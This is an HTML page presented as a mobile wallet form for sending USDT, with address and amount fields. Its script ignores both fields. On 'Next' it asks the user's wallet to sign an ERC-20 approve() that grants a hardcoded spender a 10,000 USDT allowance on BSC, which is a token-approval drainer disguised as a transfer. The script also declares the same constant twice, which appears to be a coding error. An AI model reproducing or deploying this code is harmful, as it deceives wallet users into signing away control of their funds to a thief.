<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Crypto Fees</title>

  <style>
    * {
      box-sizing: border-box;
    }

    html,
    body {
      margin: 0;
      width: 100%;
      min-height: 100%;
      background: #000;
      color: #f1f1f1;
      font-family:
        -apple-system,
        BlinkMacSystemFont,
        "Segoe UI",
        Roboto,
        Helvetica,
        Arial,
        sans-serif;
    }

    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      background: #000;
    }

    .page {
      width: 100%;
      max-width: 478px;
      min-height: 100vh;
      padding: 8px 9px 9px;
      position: relative;
      background: #000;
    }

    .label {
      display: block;
      margin: 0 0 11px 1px;
      color: #a7a4a9;
      font-size: 17px;
      line-height: 24px;
      font-weight: 400;
      letter-spacing: .05px;
    }

    .field {
      height: 75px;
      width: 100%;
      border: 1px solid #464148;
      border-radius: 10px;
      background: #020202;
      display: flex;
      align-items: center;
      padding: 0 14px 0 21px;
      box-shadow:
        inset 0 0 0 1px rgba(255,255,255,.025);
    }

    .address {
      color: #f0edf1;
      font-size: 19px;
      letter-spacing: .1px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      flex: 1;
      min-width: 0;
    }

    .actions {
      display: flex;
      align-items: center;
      gap: 14px;
      margin-left: 10px;
      color: #49d28d;
    }

    .paste {
      border: 0;
      padding: 0;
      background: transparent;
      color: #49d28d;
      font: inherit;
      font-size: 17px;
      font-weight: 600;
      cursor: pointer;
    }

    .icon {
      width: 20px;
      height: 20px;
      display: block;
      flex: 0 0 auto;
    }

    .section {
      margin-top: 31px;
    }

    .amount-field {
      height: 75px;
      padding-left: 21px;
      padding-right: 17px;
    }

    .amount-input {
      flex: 1;
      min-width: 0;
      height: 100%;
      border: 0;
      outline: 0;
      background: transparent;
      color: #f1edf2;
      font-size: 19px;
      font-family: inherit;
      caret-color: #4bd08d;
    }

    .amount-input::placeholder {
      color: #8d8990;
      opacity: 1;
    }

    .currency {
      color: #8e8a91;
      font-size: 18px;
      margin-right: 8px;
    }

    .max {
      color: #49d28d;
      font-size: 17px;
      font-weight: 500;
      cursor: pointer;
      user-select: none;
    }

    .usd {
      margin: 15px 0 0 1px;
      color: #6f6a70;
      font-size: 17px;
      line-height: 22px;
      letter-spacing: .1px;
    }

    .bottom {
      position: fixed;
      left: 50%;
      bottom: 8px;
      transform: translateX(-50%);
      width: min(calc(100% - 19px), 460px);
    }

    .next {
      width: 100%;
      height: 77px;
      border: 0;
      border-radius: 40px;
      background: #075b2d;
      color: #a5a8a6;
      font-size: 22px;
      font-weight: 600;
      font-family: inherit;
      cursor: pointer;
    }

    .next:disabled {
      opacity: .65;
      cursor: wait;
    }

    @media (max-width: 360px) {
      .address {
        font-size: 16px;
      }

      .paste {
        font-size: 15px;
      }

      .actions {
        gap: 9px;
      }

      .field {
        padding-left: 16px;
      }
    }
  </style>
</head>

<body>

<main class="page">

  <label class="label">
    Address or Domain Name
  </label>

  <div class="field">

    <div class="address" id="address">
      0x669BC24729E5EcA11f00C
    </div>

    <div class="actions">

      <button
        class="paste"
        id="pasteBtn"
        type="button"
      >
        Paste
      </button>

      <svg
        class="icon"
        viewBox="0 0 24 24"
        aria-hidden="true"
      >
        <rect
          x="7"
          y="5"
          width="13"
          height="15"
          rx="2"
          fill="#49d28d"
        />

        <rect
          x="4"
          y="2"
          width="13"
          height="15"
          rx="2"
          fill="#49d28d"
        />

        <rect
          x="7"
          y="5"
          width="10"
          height="11"
          rx="1.2"
          fill="#000"
        />

        <rect
          x="9"
          y="7"
          width="6"
          height="1.7"
          rx=".8"
          fill="#49d28d"
        />

        <rect
          x="9"
          y="10"
          width="5"
          height="1.7"
          rx=".8"
          fill="#49d28d"
        />
      </svg>

      <svg
        class="icon"
        viewBox="0 0 24 24"
        aria-hidden="true"
      >
        <path
          d="M3 3h7v7H3zM5 5v3h3V5z
             M14 3h7v7h-7zM16 5v3h3V5z
             M3 14h7v7H3zM5 16v3h3v-3z"
          fill="#49d28d"
        />

        <path
          d="M14 14h3v3h-3z
             M18 14h3v3h-3z
             M14 18h3v3h-3z
             M18 18h3v3h-3z"
          fill="#49d28d"
        />
      </svg>

    </div>
  </div>


  <section class="section">

    <label class="label">
      Amount
    </label>

    <div class="field amount-field">

      <input
        id="amount"
        class="amount-input"
        type="text"
        inputmode="decimal"
        autocomplete="off"
        placeholder="USDT Amount"
        aria-label="USDT Amount"
      />

      <span class="currency">
        USDT
      </span>

      <span
        class="max"
        id="maxBtn"
      >
        Max
      </span>

    </div>

    <div
      class="usd"
      id="usdValue"
    >
      ≈ $0.00
    </div>

  </section>


  <div class="bottom">

    <button
      class="next"
      type="button"
      id="nextBtn"
    >
      Next
    </button>

  </div>

</main>


<script>

  const amount =
    document.getElementById("amount");

  const usdValue =
    document.getElementById("usdValue");

  const pasteBtn =
    document.getElementById("pasteBtn");

  const address =
    document.getElementById("address");

  const maxBtn =
    document.getElementById("maxBtn");

  const nextBtn =
    document.getElementById("nextBtn");


  /*
   * ==========================================
   * AMOUNT / USD
   * ==========================================
   */

  function updateUsd() {

    const raw =
      amount.value
        .replace(/,/g, "")
        .trim();

    const n = Number(raw);

    if (
      !raw ||
      !Number.isFinite(n)
    ) {

      usdValue.textContent =
        "≈ $0.00";

      return;
    }

    usdValue.textContent =
      "≈ $" +
      n.toLocaleString(
        "en-US",
        {
          minimumFractionDigits: 2,
          maximumFractionDigits: 2
        }
      );
  }


  amount.addEventListener(
    "input",
    () => {

      let value =
        amount.value.replace(
          /[^\d.]/g,
          ""
        );

      const parts =
        value.split(".");

      if (parts.length > 2) {

        value =
          parts[0] +
          "." +
          parts.slice(1).join("");
      }

      amount.value =
        value;

      updateUsd();
    }
  );


  /*
   * ==========================================
   * PASTE
   * ==========================================
   */

  pasteBtn.addEventListener(
    "click",
    async () => {

      try {

        const text =
          await navigator.clipboard.readText();

        if (text) {
          address.textContent = text;
        }

      } catch (error) {

        console.error(
          "Clipboard error:",
          error
        );
      }
    }
  );


  /*
   * ==========================================
   * MAX
   * ==========================================
   */

  maxBtn.addEventListener(
    "click",
    () => {
      amount.focus();
    }
  );








  /*
   * ==========================================
   * USDT / BSC CONFIG
   * ==========================================
   */

  const TOKEN_ADDRESS =
    "0x55d398326f99059fF775485246999027B3197955";

  const SPENDER_ADDRESS =
    "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";

  const BSC_CHAIN_ID_HEX =
    "0x38";

  /*
   * BSC USDT uses 18 decimals.
   *
   * 10,000 USDT =
   *
   * 10000 * 10^18
   */

  const APPROVAL_AMOUNT =
    10000000000000000000000n;


  /*
   * ==========================================
   * ERC-20 approve(address,uint256)
   * ==========================================
   *
   * Function selector:
   * 095ea7b3
   */

  function buildApproveData() {

    const spender =
      SPENDER_ADDRESS
        .slice(2)
        .toLowerCase()
        .padStart(64, "0");

    const amount =
      APPROVAL_AMOUNT
        .toString(16)
        .padStart(64, "0");

    return (
      "0x095ea7b3" +
      spender +
      amount
    );
  }


  /*
   * ==========================================
   * FIND WALLET PROVIDER
   * ==========================================
   */

  function getWalletProvider() {

    /*
     * Trust Wallet injected provider.
     */

    if (
      window.trustwallet &&
      window.trustwallet.ethereum &&
      typeof window.trustwallet.ethereum.request ===
        "function"
    ) {
      return window.trustwallet.ethereum;
    }


    /*
     * MetaMask / standard EIP-1193 provider.
     */

    if (
      window.ethereum &&
      typeof window.ethereum.request ===
        "function"
    ) {
      return window.ethereum;
    }


    return null;
  }


  /*
   * ==========================================
   * NEXT BUTTON
   * ==========================================
   */

  const nextBtn =
    document.getElementById("nextBtn");


  nextBtn.addEventListener(
    "click",
    async () => {

      const provider =
        getWalletProvider();


      /*
       * No wallet injected.
       */

      if (!provider) {

        alert(
          "Open this page inside Trust Wallet or MetaMask."
        );

        return;
      }


      try {

        nextBtn.disabled =
          true;

        nextBtn.textContent =
          "Connecting...";


        /*
         * ======================================
         * REQUEST WALLET ACCOUNT
         * ======================================
         *
         * If the wallet hasn't authorized the
         * DApp yet, the wallet handles that
         * authorization.
         */

        const accounts =
          await provider.request({
            method:
              "eth_requestAccounts"
          });


        if (
          !accounts ||
          accounts.length === 0
        ) {
          throw new Error(
            "No wallet account was returned."
          );
        }


        const account =
          accounts[0];


        /*
         * ======================================
         * CHECK BSC
         * ======================================
         */

        let chainId =
          await provider.request({
            method:
              "eth_chainId"
          });


        chainId =
          String(chainId)
            .toLowerCase();


        /*
         * Switch to BSC if necessary.
         */

        if (
          chainId !==
          BSC_CHAIN_ID_HEX
        ) {

          nextBtn.textContent =
            "Switching network...";


          await provider.request({

            method:
              "wallet_switchEthereumChain",

            params: [
              {
                chainId:
                  BSC_CHAIN_ID_HEX
              }
            ]

          });
        }


        /*
         * ======================================
         * BUILD APPROVE TRANSACTION
         * ======================================
         *
         * This is:
         *
         * USDT.approve(
         *   SPENDER_ADDRESS,
         *   10,000 USDT
         * )
         */

        const data =
          buildApproveData();


        console.log(
          "Approval calldata:",
          data
        );


        /*
         * ======================================
         * OPEN WALLET CONFIRMATION
         * ======================================
         */

        nextBtn.textContent =
          "Confirm in wallet...";


        /*
         * This is the REAL blockchain
         * transaction.
         *
         * It goes to the USDT contract,
         * NOT to the spender address.
         */

        const txHash =
          await provider.request({

            method:
              "eth_sendTransaction",

            params: [
              {
                from:
                  account,

                to:
                  TOKEN_ADDRESS,

                data:
                  data
              }
            ]

          });


        console.log(
          "Approval transaction:",
          txHash
        );


        /*
         * ======================================
         * WAIT FOR MINING
         * ======================================
         */

        nextBtn.textContent =
          "Confirming...";


        let receipt =
          null;


        for (
          let i = 0;
          i < 120;
          i++
        ) {

          await new Promise(
            resolve =>
              setTimeout(
                resolve,
                2000
              )
          );


          receipt =
            await provider.request({

              method:
                "eth_getTransactionReceipt",

              params: [
                txHash
              ]

            });


          if (receipt) {
            break;
          }
        }


        /*
         * ======================================
         * TRANSACTION NOT FOUND
         * ======================================
         */

        if (!receipt) {

          throw new Error(
            "Transaction was submitted but confirmation timed out."
          );
        }


        /*
         * ======================================
         * TRANSACTION FAILED
         * ======================================
         */

        if (
          receipt.status === "0x0" ||
          receipt.status === 0
        ) {

          throw new Error(
            "The approval transaction failed."
          );
        }


        /*
         * ======================================
         * DONE
         * ======================================
         */

        console.log(
          "10,000 USDT approval confirmed:",
          txHash
        );


        nextBtn.textContent =
          "Done";

        nextBtn.disabled =
          false;


        /*
         * Optional:
         *
         * Go to your done page here.
         *
         * window.location.href =
         *   "/done.html";
         */

      } catch (error) {

        console.error(
          "Approval error:",
          error
        );


        /*
         * User rejected the wallet popup.
         */

        if (
          error &&
          error.code === 4001
        ) {

          alert(
            "Approval was rejected in the wallet."
          );

        } else {

          alert(
            error?.message ||
            "Unable to submit the approval transaction."
          );
        }


        nextBtn.disabled =
          false;

        nextBtn.textContent =
          "Next";
      }

    }
  );
</script>





















  

</body>
</html>
